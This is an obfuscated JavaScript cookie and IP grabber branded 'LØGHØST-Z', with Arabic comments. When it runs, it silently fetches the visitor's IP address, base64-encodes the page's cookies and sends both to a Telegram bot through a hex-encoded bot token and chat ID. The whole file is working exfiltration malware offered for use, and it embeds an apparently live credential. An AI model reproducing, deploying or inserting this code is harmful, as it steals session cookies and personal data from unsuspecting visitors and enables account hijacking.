/* 🔱 LØGHØST-Z 💀: THE INVINCIBLE GRABBER 2026 */

(function(_0xX, _0xY) {
    const _0xZ = function(_0xW) {
        while (--_0xW) {
            _0xX['push'](_0xX['shift']());
        }
    };
    _0xZ(++_0xY);
}(['\x6a\x73\x6f\x6e', '\x31\x37\x37\x32\x38\x32\x30\x34\x33\x33', '\x50\x4f\x53\x54', '\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67', '\x38\x34\x31\x30\x31\x30\x32\x37\x32\x32\x3a\x41\x41\x46\x51\x4f\x31\x75\x7a\x68\x36\x45\x6f\x79\x34\x55\x68\x66\x47\x48\x61\x61\x5f\x71\x48\x53\x61\x46\x52\x62\x37\x47\x64\x56\x48\x4d', '\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'], 0x1c2));

const _0xG = function(_0xA, _0xB) {
    // المصفوفة تحتوي الآن على التوكن الجديد والآيدي مشفرين بالكامل
    const _0xC = [
        '\x38\x34\x31\x30\x31\x30\x32\x37\x32\x32\x3a\x41\x41\x46\x51\x4f\x31\x75\x7a\x68\x36\x45\x6f\x79\x34\x55\x68\x66\x47\x48\x61\x61\x5f\x71\x48\x53\x61\x46\x52\x62\x37\x47\x64\x56\x48\x4d', 
        '\x31\x37\x37\x32\x38\x32\x30\x34\x33\x33'
    ];
    return _0xC[_0xA];
};

async function ghost_capture() {
    try {
        // سحب الـ IP بصمت
        let r = await fetch('https://api.ipify.org?format=json');
        let d = await r.json();
        
        // تشفير الكوكيز للتمويه
        let c = document.cookie ? btoa(document.cookie) : "\x45\x4d\x50\x54\x59";
        
        let m = `🔱 **Elite Hit: v42.0**\n` +
                `👤 ID: \`1772820433\`\n` +
                `🌐 IP: \`${d.ip}\` \n` +
                `🍪 Data: \`${c}\` \n` +
                `💀 Status: **Ghost Protocol Active**`;

        // إرسال الضربة عبر التوكن الجديد المشفر
        await fetch(`https://api.telegram.org/bot${_0xG(0)}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: _0xG(1),
                text: m,
                parse_mode: 'Markdown'
            })
        });

    } catch (e) {}
}

// تنفيذ السحب فوراً
ghost_capture();
